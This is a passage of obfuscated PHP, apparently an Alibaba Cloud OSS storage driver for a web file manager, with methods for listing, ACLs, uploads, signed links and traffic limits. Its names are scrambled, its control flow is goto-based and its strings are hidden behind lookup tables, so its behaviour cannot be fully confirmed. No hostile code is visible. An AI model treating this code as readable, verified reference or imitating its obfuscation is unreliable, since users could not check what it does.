$DÙÜ×—ùµñ[$dÙ—²¶­Œ[1276]] + 0); } goto E¢è÷¦åİ÷; fßî¦­‹µ: $dÙ—²¶­Œ =& $_SERVER[«¾°Ã¤]; $fôÒŒ‚ô‹ñ = array($dÙ—²¶­Œ[28] => $this->pathThis($cŞƒ‚Ø¨©), $dÙ—²¶­Œ[76] => $this->getPathOuter($cŞƒ‚Ø¨©), $dÙ—²¶­Œ[29] => $dÙ—²¶­Œ[193], $dÙ—²¶­Œ[78] => isset($eŠŒŸë´î[$dÙ—²¶­Œ[78]]) ? $eŠŒŸë´î[$dÙ—²¶­Œ[78]] : 0, $dÙ—²¶­Œ[168] => $this->ext($cŞƒ‚Ø¨©)); if ($C¯‚Ôæ»×) { return $fôÒŒ‚ô‹ñ; } goto F‡í†î¡Ô; E¢è÷¦åİ÷: if (isset($eŠŒŸë´î[$dÙ—²¶­Œ[78]])) { $fôÒŒ‚ô‹ñ[$dÙ—²¶­Œ[78]] = $eŠŒŸë´î[$dÙ—²¶­Œ[78]]; } if (isset($eŠŒŸë´î[$dÙ—²¶­Œ[84]])) { $fôÒŒ‚ô‹ñ[$dÙ—²¶­Œ[84]] = $eŠŒŸë´î[$dÙ—²¶­Œ[84]]; } if (isset($eŠŒŸë´î[$dÙ—²¶­Œ[197]]) && !trim($fôÒŒ‚ô‹ñ[$dÙ—²¶­Œ[84]])) { $fôÒŒ‚ô‹ñ[$dÙ—²¶­Œ[84]] = $eŠŒŸë´î[$dÙ—²¶­Œ[197]]; } goto aË­§·Š; aË­§·Š: return $fôÒŒ‚ô‹ñ; goto CÜ©ÂÍĞ·¿; CÜ©ÂÍĞ·¿: } private function folderInfo($F£ê¹Š©°¬, $aå”Éİ¨Ë´ = false, $e°¿¸äÙáµ = array()) { goto F–‚ğ‡é´»; FÓ¶ì³ÒŠ: $b‰Ê•ƒÏ¶ö[$eõÃÌ¨£ä—[194]] = $b‰Ê•ƒÏ¶ö[$eõÃÌ¨£ä—[84]] = 0; $b‰Ê•ƒÏ¶ö[$eõÃÌ¨£ä—[195]] = $b‰Ê•ƒÏ¶ö[$eõÃÌ¨£ä—[196]] = !0; if (empty($e°¿¸äÙáµ)) { $F£ê¹Š©°¬ = rtrim($F£ê¹Š©°¬, $eõÃÌ¨£ä—[8]) . $eõÃÌ¨£ä—[8]; $fÑ£»ì²å• = $this->objectMeta($F£ê¹Š©°¬); if (!$fÑ£»ì²å•) { return $b‰Ê•ƒÏ¶ö; } $e°¿¸äÙáµ = array($eõÃÌ¨£ä—[194] => $fÑ£»ì²å•[$eõÃÌ¨£ä—[1284]][$eõÃÌ¨£ä—[1285]], $eõÃÌ¨£ä—[84] => strtotime($fÑ£»ì²å•[$eõÃÌ¨£ä—[1277]])); } goto bŞÁßÚ”¨á; F–‚ğ‡é´»: $eõÃÌ¨£ä— =& $_SERVER[«¾°Ã¤]; $b‰Ê•ƒÏ¶ö = array($eõÃÌ¨£ä—[28] => $this->pathThis($F£ê¹Š©°¬), $eõÃÌ¨£ä—[76] => $this->getPathOuter($eõÃÌ¨£ä—[8] . $F£ê¹Š©°¬), $eõÃÌ¨£ä—[29] => $eõÃÌ¨£ä—[77]); if ($aå”Éİ¨Ë´) { return $b‰Ê•ƒÏ¶ö; } goto FÓ¶ì³ÒŠ; bŞÁßÚ”¨á: if (isset($e°¿¸äÙáµ[$eõÃÌ¨£ä—[84]])) { $b‰Ê•ƒÏ¶ö[$eõÃÌ¨£ä—[84]] = $e°¿¸äÙáµ[$eõÃÌ¨£ä—[84]]; } if (isset($e°¿¸äÙáµ[$eõÃÌ¨£ä—[194]])) { $b‰Ê•ƒÏ¶ö[$eõÃÌ¨£ä—[194]] = $e°¿¸äÙáµ[$eõÃÌ¨£ä—[194]]; } return $b‰Ê•ƒÏ¶ö; goto Bö§öØ¬Ğ; Bö§öØ¬Ğ: } public function listPath($Aİ÷”‹Æã, $cÀóª½£é = false) { $C®Ëğ…Œç¸ =& $_SERVER[«¾°Ã¤]; $AÛ™íµøñ¨ = $this->fileList($Aİ÷”‹Æã, $C®Ëğ…Œç¸[8], !0); foreach ($AÛ™íµøñ¨[$C®Ëğ…Œç¸[75]] as $aõòö‡‰Ø™ => $aÎÁ©Ë¿Ò…) { $AÛ™íµøñ¨[$C®Ëğ…Œç¸[75]][$aõòö‡‰Ø™] = $this->folderInfo($aÎÁ©Ë¿Ò…, $cÀóª½£é, $aÎÁ©Ë¿Ò…); } foreach ($AÛ™íµøñ¨[$C®Ëğ…Œç¸[74]] as $aõòö‡‰Ø™ => $aÎÁ©Ë¿Ò…) { $AÛ™íµøñ¨[$C®Ëğ…Œç¸[74]][$aõòö‡‰Ø™] = $this->fileInfo($aÎÁ©Ë¿Ò…[$C®Ëğ…Œç¸[28]], $cÀóª½£é, $aÎÁ©Ë¿Ò…); } return $AÛ™íµøñ¨; } public function has($D‚‹Õ‘ ‹¤, $e£ŞÌ¤Í´ç = false, $D·ï“Ã¥Í = true) { goto BƒŒÚ‘†¦; C‡¤ŞÌšÊ: $f•š„æËÕ· = $dò…ôª¸ğ±[33]; $cÇ¼¬š‹±˜ = 500; $EÉ…òÌòÕ = $c†ã¶òÇÀí = 0; goto F“ê­ˆé®; F“ê­ˆé®: while (!0) { check_abort(); $fÑÏˆÄ¤¶‹ = array($dò…ôª¸ğ±[1272] => $dò…ôª¸ğ±[8], $dò…ôª¸ğ±[1273] => $ašÇ¥­…½§, $dò…ôª¸ğ±[1274] => $cÇ¼¬š‹±˜, $dò…ôª¸ğ±[1275] => $f•š„æËÕ·); try { $a‚“ëã³ô = $this->client->listObjects($this->bucket, $fÑÏˆÄ¤¶‹); } catch (OSS\Core\OssException $cÃŞÓÆ°“°) { break; } $f•š„æËÕ· = $a‚“ëã³ô->getNextMarker(); $CŸî´ô¢§¾ = $a‚“ëã³ô->getObjectList(); $aÛÒ¯ÜºÂ° = $a‚“ëã³ô->getPrefixList(); if ($e£ŞÌ¤Í´ç) { if (count($CŸî´ô¢§¾) > 1 || count($CŸî´ô¢§¾) == 1 && $CŸî´ô¢§¾[0]->getKey() != $ašÇ¥­…½§) { $EÉ…òÌòÕ += count($CŸî´ô¢§¾) - 1; } if (!empty($aÛÒ¯ÜºÂ°)) { $c†ã¶òÇÀí += count($aÛÒ¯ÜºÂ°); } if ($f•š„æËÕ· === $dò…ôª¸ğ±[33]) { break; } continue; } if ($D·ï“Ã¥Í) { if (!empty($CŸî´ô¢§¾)) { if (count($CŸî´ô¢§¾) > 1 || $CŸî´ô¢§¾[0]->getKey() != $ašÇ¥­…½§) { return !0; } } } else { if (!empty($aÛÒ¯ÜºÂ°)) { return !0; } } if ($f•š„æËÕ· === $dò…ôª¸ğ±[33]) { break; } } if ($e£ŞÌ¤Í´ç) { return array($dò…ôª¸ğ±[203] => $EÉ…òÌòÕ, $dò…ôª¸ğ±[204] => $c†ã¶òÇÀí); } return !1; goto Fäòî•Ö¥; BƒŒÚ‘†¦: $dò…ôª¸ğ± =& $_SERVER[«¾°Ã¤]; $D‚‹Õ‘ ‹¤ = trim($D‚‹Õ‘ ‹¤, $dò…ôª¸ğ±[8]); $ašÇ¥­…½§ = empty($D‚‹Õ‘ ‹¤) && $D‚‹Õ‘ ‹¤ !== $dò…ôª¸ğ±[191] ? $dò…ôª¸ğ±[33] : $D‚‹Õ‘ ‹¤ . $dò…ôª¸ğ±[8]; goto C‡¤ŞÌšÊ; Fäòî•Ö¥: } public function listAll($e¹ƒ•ÈÇ‚») { $aÈ…¶ŠÖÈ =& $_SERVER[«¾°Ã¤]; $a·†åÏØçÄ = $this->fileList($e¹ƒ•ÈÇ‚», $aÈ…¶ŠÖÈ[33], !0); $dÁé¶ã‚Ô¿ = array(); foreach ($a·†åÏØçÄ[$aÈ…¶ŠÖÈ[74]] as $f­«‰¯ÉâÒ) { $dÁé¶ã‚Ô¿[$f­«‰¯ÉâÒ[$aÈ…¶ŠÖÈ[28]]] = $f­«‰¯ÉâÒ[$aÈ…¶ŠÖÈ[78]]; } foreach ($a·†åÏØçÄ[$aÈ…¶ŠÖÈ[75]] as $f­«‰¯ÉâÒ) { if (is_string($f­«‰¯ÉâÒ)) { $dÁé¶ã‚Ô¿[$f­«‰¯ÉâÒ] = 0; } } return $this->listAllFiles($e¹ƒ•ÈÇ‚», array_keys($dÁé¶ã‚Ô¿), $dÁé¶ã‚Ô¿); } public function canRead($Fì‰„ŒÈË‹) { $c´²±ä©­ =& $_SERVER[«¾°Ã¤]; $cñƒ´ ¨„¿ = $this->pathAcl($Fì‰„ŒÈË‹); return $cñƒ´ ¨„¿ == $c´²±ä©­[1286] || $cñƒ´ ¨„¿ == $c´²±ä©­[528] ? !0 : !1; } public function canWrite($a«õ‰¤Ğ–) { $Fçî°¡Ìá¼ = $this->pathAcl($a«õ‰¤Ğ–); return $Fçî°¡Ìá¼ == $_SERVER[«¾°Ã¤][528] ? !0 : !1; } public function pathAcl($d¸çÅåŠÀ°) { goto DĞ‰â³Î³ä; DĞ‰â³Î³ä: $aíø¦²¿Ùô =& $_SERVER[«¾°Ã¤]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $F¤…óê¶†¼ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($d¸çÅåŠÀ°)); } catch (OSS\Core\OssException $FÄêì†Ä¦Ğ) { return !1; } goto BñÑ½ë²à§; BƒèÌ…¿ƒ: return $CƒÅ¦ìïÄ; goto CÌĞÛ ß¿¢; BñÑ½ë²à§: $CƒÅ¦ìïÄ = $F¤…óê¶†¼ == $aíø¦²¿Ùô[34] ? $this->bucketAcl : $F¤…óê¶†¼; if ($CƒÅ¦ìïÄ == $aíø¦²¿Ùô[1287]) { return $aíø¦²¿Ùô[1286]; } if ($CƒÅ¦ìïÄ == $aíø¦²¿Ùô[1288]) { return $aíø¦²¿Ùô[528]; } goto BƒèÌ…¿ƒ; CÌĞÛ ß¿¢: } private function chmodPath($bá–ßÜê²™, $bĞâ•‚á ¬ = '') { $Bß´ÖŠœ =& $_SERVER[«¾°Ã¤]; $aƒ†‹ó˜ò = empty($bĞâ•‚á ¬) ? $Bß´ÖŠœ[1288] : $bĞâ•‚á ¬; $D¸Êğà¶Š¨ = array($Bß´ÖŠœ[34], $Bß´ÖŠœ[192], $Bß´ÖŠœ[1287], $Bß´ÖŠœ[1288]); if (!in_array($aƒ†‹ó˜ò, $D¸Êğà¶Š¨)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($bá–ßÜê²™), $aƒ†‹ó˜ò); } catch (OSS\Core\OssException $A„‹è‚»³“) { return !1; } return !0; } public function getContent($C¯èÖŒ‘„) { return $this->fileSubstr($C¯èÖŒ‘„, -1); } public function setContent($BİàÓ­¢É, $Dí…ĞîÆ…† = '') { $bÕ‘­¦œˆ =& $_SERVER[«¾°Ã¤]; try { $AŠòå÷è¦Ó = $this->trafficLimit($bÕ‘­¦œˆ[1289]); $bºõ®ãÑ£ = $this->client->putObject($this->bucket, $this->pathEncode($BİàÓ­¢É), $Dí…ĞîÆ…†, $AŠòå÷è¦Ó); } catch (OSS\Core\OssException $A‚ĞØàë¶º) { return !1; } $DŠ½¢Œ¨ÖÃ = array($bÕ‘­¦œˆ[1278] => trim($bºõ®ãÑ£[$bÕ‘­¦œˆ[1290]], $bÕ‘­¦œˆ[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($BİàÓ­¢É))); $this->updateObjMeta($BİàÓ­¢É, $DŠ½¢Œ¨ÖÃ); return isset($bºõ®ãÑ£[$bÕ‘­¦œˆ[1291]][$bÕ‘­¦œˆ[1237]]) ? !0 : !1; } private function updateObjMeta($EÛ²Àîˆ, $DÉ­Ÿ®•ó ) { $EÛ²Àîˆ = $this->pathEncode($EÛ²Àîˆ); try { $B ä¤®âß¯ = array(OSS\OssClient::OSS_HEADERS => $DÉ­Ÿ®•ó ); $this->client->copyObject($this->bucket, $EÛ²Àîˆ, $this->bucket, $EÛ²Àîˆ, $B ä¤®âß¯); } catch (OSS\Core\OssException $eø‹İÖ‚Ç) { return !1; } return !0; } public function upload($b·Åù‰¢‘¾, $D©òğ£ÀŠ’, $aª‹Ú²À½ñ = false, $B§ÙÛõ„åò = REPEAT_REPLACE) { $C¡„…™òæ© =& $_SERVER[«¾°Ã¤]; $f¢¼í¡ª¯› = trim($b·Åù‰¢‘¾, $C¡„…™òæ©[8]); $f»‰´ÜßÑ† = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($C¡„…™òæ©[1278] => @md5_file($D©òğ£ÀŠ’)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($b·Åù‰¢‘¾))); $f»‰´ÜßÑ† = $this->trafficLimit($C¡„…™òæ©[1289], $f»‰´ÜßÑ†); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($f¢¼í¡ª¯›), $D©òğ£ÀŠ’, $f»‰´ÜßÑ†); } catch (OSS\Core\OssException $BÓêˆÃ¬È±) { return !1; } return $this->getPathOuter($b·Åù‰¢‘¾); } public function getHost() { $cË§Ô©ê„â =& $_SERVER[«¾°Ã¤]; $B×ïƒÓŠÃë = explode($cË§Ô©ê„â[177], parent::getHost()); return $B×ïƒÓŠÃë[0] . $cË§Ô©ê„â[177] . $this->bucket . $cË§Ô©ê„â[95] . $B×ïƒÓŠÃë[1]; } public function uploadFormData($A·ìØÍ³Ô›, $dî¥¤²®Ôó = 3600) { goto EŞ·ĞßÏõƒ; C™ó×¿Ç¢È: $C‡àğ›‡ô£ = strpos($Eİ·ˆÓòÙ, $C¶Ş™Æä†Ë[294]); $Eİ·ˆÓòÙ = substr($Eİ·ˆÓòÙ, 0, $C‡àğ›‡ô£) . $C¶Ş™Æä†Ë[1293]; $Bí¸â‘Õì§ = 1048576000 * 5; goto aÙ¿±ò¯íº; BÖÛãÛÏé : return $bøäààÄá°; goto d¬‹Ù‘ÁÄ; EŞ·ĞßÏõƒ: $C¶Ş™Æä†Ë =& $_SERVER[«¾°Ã¤]; if (!($b§ÒÜ·…Ü‚ = $this->getHost())) { return !1; } $Eˆ¼ó‡Ú®ç = $dî¥¤²®Ôó; goto bÆÜó†í¿Ë; bÆÜó†í¿Ë: $AÚ½âÒ×Œ‘ = date($C¶Ş™Æä†Ë[1292], time() + $Eˆ¼ó‡Ú®ç); $cÙ¯¢Ï°¾È = new DateTime($AÚ½âÒ×Œ‘); $Eİ·ˆÓòÙ = $cÙ¯¢Ï°¾È->format(DateTime::ISO8601); goto C™ó×¿Ç¢È; aÙ¿±ò¯íº: $e›ƒÆŞ¼Š¥ = $this->pathFather($A·ìØÍ³Ô›); $F¶ó¸ìôŸ = array($C¶Ş™Æä†Ë[1192] => $Eİ·ˆÓòÙ, $C¶Ş™Æä†Ë[1193] => array(array($C¶Ş™Æä†Ë[1294], 0, $Bí¸â‘Õì§), array($C¶Ş™Æä†Ë[1196], $C¶Ş™Æä†Ë[1197], $e›ƒÆŞ¼Š¥))); $C¢ŞŸ¿‡™É = base64_encode(json_encode($F¶ó¸ìôŸ)); goto b¹‡´É¼Ã; b¹‡´É¼Ã: $c–Ÿç¦Ù¥Æ = base64_encode(hash_hmac($C¶Ş™Æä†Ë[230], $C¢ŞŸ¿‡™É, $this->secret, !0)); $bøäààÄá° = array($C¶Ş™Æä†Ë[1202] => $C¢ŞŸ¿‡™É, $C¶Ş™Æä†Ë[1295] => $this->accessKey, $C¶Ş™Æä†Ë[1198] => $C¶Ş™Æä†Ë[1190], $C¶Ş™Æä†Ë[1296] => $c–Ÿç¦Ù¥Æ, $C¶Ş™Æä†Ë[175] => $b§ÒÜ·…Ü‚); $bøäààÄá° = $this->trafficLimit($C¶Ş™Æä†Ë[1289], $bøäààÄá°); goto BÖÛãÛÏé ; d¬‹Ù‘ÁÄ: } public function multiUploadFormData($e…²ì‚Ôóê, $dÌİÀÆ‹ìÆ = 3600) { $fŸé¯á‡à =& $_SERVER[«¾°Ã¤]; if (!($dÔ¼ßÎÜôÓ = $this->getHost())) { return !1; } $aíÅƒ¬”ø = $this->trafficLimit($fŸé¯á‡à[1289]); $eÜøÙñ§ê = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($e…²ì‚Ôóê), $aíÅƒ¬”ø); return array($fŸé¯á‡à[221] => $eÜøÙñ§ê, $fŸé¯á‡à[175] => $dÔ¼ßÎÜôÓ . $fŸé¯á‡à[8] . $this->pathEncode($e…²ì‚Ôóê), $fŸé¯á‡à[222] => gmdate($fŸé¯á‡à[1297]), $fŸé¯á‡à[93] => $e…²ì‚Ôóê); } public function multiUploadAuthData($BÈà­¨šÄ, $cãê°—¹îÓ = array()) { goto D¯…î¾òâ; DŞÉÄ…îŠ‚: $E¡ïºÎÇõ« = $d—¹Ñ±¾¹[1262] . $this->accessKey . $d—¹Ñ±¾¹[4] . $a‹¼¬Ç´æ; if (strpos($cÉŠøÎìè‚, $d—¹Ñ±¾¹[225]) === 0) { $E¡ïºÎÇõ« = array($d—¹Ñ±¾¹[232] => $E¡ïºÎÇõ«, $d—¹Ñ±¾¹[222] => $Dİ³ËËË‰Ÿ); if ($a¦Ïˆ­‘Ó») { $E¡ïºÎÇõ« = array_merge($E¡ïºÎÇõ«, $a¦Ïˆ­‘Ó»); } } return $E¡ïºÎÇõ«; goto DÖÜğîÃ¢Ø; Eá®ˆùª¯ó: if (!empty($cãê°—¹îÓ[$d—¹Ñ±¾¹[1299]])) { $C¹´‹¿Œ¬Û = array_merge(array($AÓÔ¦­Õ[4]), $cãê°—¹îÓ[$d—¹Ñ±¾¹[1299]]); sort($C¹´‹¿Œ¬Û); $AÓÔ¦­Õ[4] = implode($d—¹Ñ±¾¹[229], $C¹´‹¿Œ¬Û); } $bò¾ˆùˆ§ = implode($d—¹Ñ±¾¹[229], $AÓÔ¦­Õ); $a‹¼¬Ç´æ = base64_encode(hash_hmac($d—¹Ñ±¾¹[230], $bò¾ˆùˆ§, $this->secret, !0)); goto DŞÉÄ…îŠ‚; B¦æ¹±ó¤„: $bø‘·¨â‚÷ = $BÈà­¨šÄ; if (isset($cãê°—¹îÓ[$d—¹Ñ±¾¹[93]])) { $bø‘·¨â‚÷ = $cãê°—¹îÓ[$d—¹Ñ±¾¹[93]]; unset($cãê°—¹îÓ[$d—¹Ñ±¾¹[93]]); } if (isset($cãê°—¹îÓ[$d—¹Ñ±¾¹[223]])) { $cãê°—¹îÓ[$d—¹Ñ±¾¹[222]] = $Dİ³ËËË‰Ÿ; return $this->listUploadParts($bø‘·¨â‚÷, $cãê°—¹îÓ); } goto aâğ“„İ±ô; aâğ“„İ±ô: $AÓÔ¦­Õ = array($d—¹Ñ±¾¹[224], $d—¹Ñ±¾¹[33], $d—¹Ñ±¾¹[119], $Dİ³ËËË‰Ÿ, "\170\x2d\157\x73\163\x2d\144\x61\164\145\x3a{$Dİ³ËËË‰Ÿ}", $d—¹Ñ±¾¹[8] . $this->bucket . $d—¹Ñ±¾¹[8] . $bø‘·¨â‚÷ . $cÉŠøÎìè‚); if (strpos($cÉŠøÎìè‚, $d—¹Ñ±¾¹[225]) === 0) { $AÓÔ¦­Õ[0] = $d—¹Ñ±¾¹[226]; if ($a¦Ïˆ­‘Ó» = $this->trafficLimit($d—¹Ñ±¾¹[1289])) { $bø‘·¨â‚÷ = $d—¹Ñ±¾¹[1298]; array_splice($AÓÔ¦­Õ, 5, 0, $bø‘·¨â‚÷ . $d—¹Ñ±¾¹[4] . $a¦Ïˆ­‘Ó»[$bø‘·¨â‚÷]); } } if (isset($cãê°—¹îÓ[$d—¹Ñ±¾¹[227]]) && $cãê°—¹îÓ[$d—¹Ñ±¾¹[227]] == $d—¹Ñ±¾¹[228]) { $AÓÔ¦­Õ[0] = $d—¹Ñ±¾¹[228]; } goto Eá®ˆùª¯ó; D¯…î¾òâ: $d—¹Ñ±¾¹ =& $_SERVER[«¾°Ã¤]; $Dİ³ËËË‰Ÿ = isset($cãê°—¹îÓ[$d—¹Ñ±¾¹[222]]) ? $cãê°—¹îÓ[$d—¹Ñ±¾¹[222]] : gmdate($d—¹Ñ±¾¹[1297]); $cÉŠøÎìè‚ = isset($cãê°—¹îÓ[$d—¹Ñ±¾¹[168]]) ? $cãê°—¹îÓ[$d—¹Ñ±¾¹[168]] : $d—¹Ñ±¾¹[33]; goto B¦æ¹±ó¤„; DÖÜğîÃ¢Ø: } public function listUploadParts($FÍØ´Ú‘×Ü, $EÂáĞèĞ²) { goto a°é¼Ç¤™Í; e×¦¾ÑçŸÉ: $Aˆ™õêŸŠ† = $fÍÚÄŞ»¤“->getListPart(); $d×‡ƒ±âáë = array(); foreach ($Aˆ™õêŸŠ† as $D‰¦„À°Ä¯) { $d×‡ƒ±âáë[] = array($CÎ¥†È°Ì[1282] => $D‰¦„À°Ä¯->getPartNumber(), $CÎ¥†È°Ì[1283] => trim($D‰¦„À°Ä¯->getETag(), $CÎ¥†È°Ì[116])); } goto c§¤‰ÛÁ°ø; b¢»°©¬Á: return array($CÎ¥†È°Ì[232] => $E¸ö¶ˆ±¦Ì, $CÎ¥†È°Ì[222] => $EÂáĞèĞ²[$CÎ¥†È°Ì[222]], $CÎ¥†È°Ì[234] => $d×‡ƒ±âáë); goto E½öˆÙÁˆ; a°é¼Ç¤™Í: $CÎ¥†È°Ì =& $_SERVER[«¾°Ã¤]; $eê¹­“Í œ = parse_url_query($EÂáĞèĞ²[$CÎ¥†È°Ì[168]]); $fÍÚÄŞ»¤“ = $this->client->listParts($this->bucket, $this->pathEncode($FÍØ´Ú‘×Ü), $eê¹­“Í œ[$CÎ¥†È°Ì[221]]); goto e×¦¾ÑçŸÉ; c§¤‰ÛÁ°ø: unset($EÂáĞèĞ²[$CÎ¥†È°Ì[223]], $EÂáĞèĞ²[$CÎ¥†È°Ì[227]]); $E¸ö¶ˆ±¦Ì = $this->multiUploadAuthData($FÍØ´Ú‘×Ü, $EÂáĞèĞ²); if (empty($E¸ö¶ˆ±¦Ì)) { return !1; } goto b¢»°©¬Á; E½öˆÙÁˆ: } public function download($cÛĞ™ÈƒĞ¤, $b‚ÚŸÙï) { if ($this->isFolder($cÛĞ™ÈƒĞ¤)) { return !1; } try { $C¹ÆÃÏÓƒƒ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $b‚ÚŸÙï); $C¹ÆÃÏÓƒƒ = $this->trafficLimit($_SERVER[«¾°Ã¤][109], $C¹ÆÃÏÓƒƒ); $this->client->getObject($this->bucket, $this->pathEncode($cÛĞ™ÈƒĞ¤), $C¹ÆÃÏÓƒƒ); } catch (OSS\Core\OssException $D´«šÑ‚¶à) { return !1; } return $b‚ÚŸÙï; } public function fileSubstr($FÚæ£éª®•, $d´„³š·½á = 0, $fäå¤³…ÔÏ = false) { if ($d´„³š·½á === -1) { $eƒéğ‡¥— = array(); } else { if ($fäå¤³…ÔÏ === !1) { $BˆÙ«õŞ± = $this->size($FÚæ£éª®•); } else { $BˆÙ«õŞ± = $d´„³š·½á + $fäå¤³…ÔÏ - 1; } $eƒéğ‡¥— = array(OSS\OssClient::OSS_RANGE => "{$d´„³š·½á}\x2d{$BˆÙ«õŞ±}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($FÚæ£éª®•), $eƒéğ‡¥—); } catch (OSS\Core\OssException $c›¿ŠÂ¦ï§) { think_exception($c›¿ŠÂ¦ï§->getMessage()); return !1; } } private function trafficLimit($aëî­Ş«¨Ç, $D¥õ–ˆß×Á = array()) { goto dŞÃ¤ Ì ò; c‰’‡¥¦ˆ¨: if (!$A‹ÆÔÀÆ) { return $D¥õ–ˆß×Á; } $A‹ÆÔÀÆ = $A‹ÆÔÀÆ < 819200 ? 819200 : ($A‹ÆÔÀÆ > 838860800 ? 838860800 : $A‹ÆÔÀÆ); $D¥õ–ˆß×Á[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($A‹ÆÔÀÆ); goto dœ†è¤‹‘‘; dŞÃ¤ Ì ò: $fô­Ë¿“é‹ =& $_SERVER[«¾°Ã¤]; if ($aëî­Ş«¨Ç == $fô­Ë¿“é‹[1289] && $this->isUploadServer() || $aëî­Ş«¨Ç == $fô­Ë¿“é‹[109] && $this->isFileOutServer()) { return $D¥õ–ˆß×Á; } $A‹ÆÔÀÆ = floatval($GLOBALS[$fô­Ë¿“é‹[6]][$fô­Ë¿“é‹[88]][$fô­Ë¿“é‹[107]][$aëî­Ş«¨Ç]) * 1024 * 1024 * 8; goto c‰’‡¥¦ˆ¨; dœ†è¤‹‘‘: return $D¥õ–ˆß×Á; goto e–‘‡Ó•È; e–‘‡Ó•È: } public function link($eä®£Ûàƒ, $c¢×Å¦”ã = array()) { $fİÊêäÓ°É =& $_SERVER[«¾°Ã¤]; if (!$this->exist($eä®£Ûàƒ) || $this->isFolder($eä®£Ûàƒ)) { return !1; } try { $c¢×Å¦”ã = $this->trafficLimit($fİÊêäÓ°É[109], $c¢×Å¦”ã); $aèª•°°ñ¸ = $this->client->signUrl($this->bucket, $this->pathEncode($eä®£Ûàƒ), 3600 * 12, $fİÊêäÓ°É[228], $c¢×Å¦”ã); return $this->getCdnLink($aèª•°°ñ¸); } catch (OSS\Core\OssException $aŸ‰‚ƒğ‹¸) { return !1; } } public function fileOut($D·Š…³¤£¥, $Aô¦¾‘¤ˆ = false, $F”¡¨Øá‚‚ = false, $eõùí‡é­ˆ = '') { goto f³å‰ìÉ£„; e§”—×®Ê: $e‘ÜğŠé¼ = $this->link($D·Š…³¤£¥, $C±·ó¢Ñˆ); $this->fileOutLink($e‘ÜğŠé¼); goto cë¬×İè´‚; BÎ½ÉÉÁ…: $Aô¦¾‘¤ˆ = $Aô¦¾‘¤ˆ ? $fÀ¸Î‡ª²–[214] : $fÀ¸Î‡ª²–[215]; $C±·ó¢Ñˆ = array(OSS\OssClient::OSS_SUB_RESOURCE => $fÀ¸Î‡ª²–[1300] . rawurlencode("{$Aô¦¾‘¤ˆ}\73\x66\151\154\145\156\x61\x6d\145\x3d{$F”¡¨Øá‚‚}")); $C±·ó¢Ñˆ[OSS\OssClient::OSS_SUB_RESOURCE] .= $fÀ¸Î‡ª²–[1301] . rawurlencode($F”Ò’‘¥ÕŠ); goto e§”—×®Ê; bœ³“‰´¾é: $F”¡¨Øá‚‚ = rawurlencode($F”¡¨Øá‚‚); $F”Ò’‘¥ÕŠ = get_file_mime(get_path_ext($F”¡¨Øá‚‚)); if ($F”Ò’‘¥ÕŠ == $fÀ¸Î‡ª²–[213]) { return parent::fileOut($D·Š…³¤£¥, $Aô¦¾‘¤ˆ, $F”¡¨Øá‚‚, $eõùí‡é­ˆ); } goto BÎ½ÉÉÁ…; f³å‰ìÉ£„: $fÀ¸Î‡ª²– =& $_SERVER[«¾°Ã¤]; if ($this->isFileOutServer()) { return $this->fileOutServer($D·Š…³¤£¥, $Aô¦¾‘¤ˆ, $F”¡¨Øá‚‚, $eõùí‡é­ˆ); } if (!$F”¡¨Øá‚‚) { $F”¡¨Øá‚‚ = $this->pathThis($D·Š…³¤£¥); } goto bœ³“‰´¾é; cë¬×İè´‚: } public function fileOutServer($F¥šì ğîõ, $eÜ² ¥¥É = false, $f×«ÒÌæ° = false, $c…‘ôß÷Ö = '') { parent::fileOut($F¥šì ğîõ, $eÜ² ¥¥É, $f×«ÒÌæ°, $c…‘ôß÷Ö); } public function fileOutImage($DïĞÃì‘º, $aĞÛ¿Ãò÷ = 250) { $c·Î‘¹ĞŞî = array(OSS\OssClient::OSS_PROCESS => $_SERVER[«¾°Ã¤][1302] . $aĞÛ¿Ãò÷); $F ÇÌİ“”… = $this->link($DïĞÃì‘º, $c·Î‘¹ĞŞî); $this->fileOutLink($F ÇÌİ“”…); } public function fileOutImageServer($eÁÕ‡¾›ËÈ, $fÜ‰•‰öÀñ = 250) { parent::fileOutImage($eÁÕ‡¾›ËÈ, $fÜ‰•‰öÀñ); } public function fileOutLink($FßŞ‚šéğ) { $AÃÎĞƒŸ =& $_SERVER[«¾°Ã¤]; if (!$this->isCdnHost() && substr($FßŞ‚šéğ, 0, 7) == $AÃÎĞƒŸ[1205]) { $FßŞ‚šéğ = $AÃÎĞƒŸ[1206] . substr($FßŞ‚šéğ, 7); } header($AÃÎĞƒŸ[159] . $FßŞ‚šéğ); die; } public function hashMd5($A©Œ‘ä”ê—, $D¬£” ˜ç„ = '') { $bØäª‰çĞ‘ =& $_SERVER[«¾°Ã¤]; $Aƒ£öÀë÷œ = $this->_objectMeta($A©Œ‘ä”ê—); if (!$Aƒ£öÀë÷œ) { return $bØäª‰çĞ‘[33]; } if (!isset($Aƒ£öÀë÷œ[$bØäª‰çĞ‘[1278]]) && !empty($D¬£” ˜ç„)) { $FøÛ”å¾Ç = $this->updateObjMeta($A©Œ‘ä”ê—, array($bØäª‰çĞ‘[1278] => $D¬£” ˜ç„)); $Aƒ£öÀë÷œ[$bØäª‰çĞ‘[1278]] = $FøÛ”å¾Ç ? $D¬£” ˜ç„ : $bØäª‰çĞ‘[33]; } return isset($Aƒ£öÀë÷œ[$bØäª‰çĞ‘[1278]]) ? strtolower($Aƒ£öÀë÷œ[$bØäª‰çĞ‘[1278]]) : $bØäª‰çĞ‘[33]; } public function size($b„ñÈÂ„¯¢) { $b¶µœƒ„Š = $this->objectMeta($b„ñÈÂ„¯¢); return $b¶µœƒ„Š ? $b¶µœƒ„Š[$_SERVER[«¾°Ã¤][78]] : 0; } public function info($e’„æÙ¤™—) { if ($this->isFolder($e’„æÙ¤™—)) { return $this->folderInfo($e’„æÙ¤™—); } else { if ($this->isFile($e’„æÙ¤™—)) { return $this->fileInfo($e’„æÙ¤™—); } } return !1; } public function 